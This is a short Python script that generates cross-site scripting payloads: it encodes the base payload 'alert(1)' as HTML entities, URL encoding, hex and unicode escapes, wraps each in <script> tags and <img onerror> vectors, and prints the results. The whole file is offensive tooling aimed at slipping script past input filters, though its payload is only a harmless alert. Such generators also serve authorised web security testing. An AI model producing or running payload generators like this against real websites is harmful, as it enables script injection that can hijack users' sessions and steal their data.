import urllib.parse

def generate_xss_payloads(base_payload):
    # Encode payload in various ways
    encoded_payloads = {
        'html_entities': ''.join(['&#{};'.format(ord(char)) for char in base_payload]),
        'url_encode': urllib.parse.quote(base_payload),
        'hex_encoding': ''.join(['\\x{:02x}'.format(ord(char)) for char in base_payload]),
        'unicode_encoding': ''.join(['\\u{:04x}'.format(ord(char)) for char in base_payload]),
    }
    
    # Add common XSS vectors
    payloads = []
    for encoding, payload in encoded_payloads.items():
        payloads.append(f'<script>{payload}</script>')
        payloads.append(f'<img src=x onerror={payload}>')
    
    return payloads

# Base XSS payload
base_payload = 'alert(1)'

# Generate encoded XSS payloads
xss_payloads = generate_xss_payloads(base_payload)

# Display the payloads
for payload in xss_payloads:
    print(payload)
